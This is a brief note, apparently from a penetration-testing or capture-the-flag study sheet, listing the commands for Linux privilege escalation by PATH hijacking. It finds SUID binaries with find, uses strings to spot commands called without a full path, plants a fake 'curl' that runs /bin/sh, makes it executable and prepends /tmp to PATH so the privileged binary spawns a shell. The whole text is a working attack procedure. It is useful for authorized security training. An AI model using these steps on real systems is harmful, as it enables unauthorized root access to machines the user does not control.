 - use `find / -type f -perm -04000 -ls 2>/dev/null` to find binaries with the SUID bit set
 - use strings on the found weird binary `strings <binary_full_path>`
	 - look for any commands inside the binary that don't have the full path specified (e.g. curl)
 - inject a /bin/sh command into fake version of one of the programs listed in the strings step  `echo /bin/sh > curl`
 - change permission on the fake program `chmod 777 curl`
 - export your path to the directory where the fake program is, example:
	 - if your 'curl' program is in the tmp directory use this: `export PATH=/tmp:$PATH`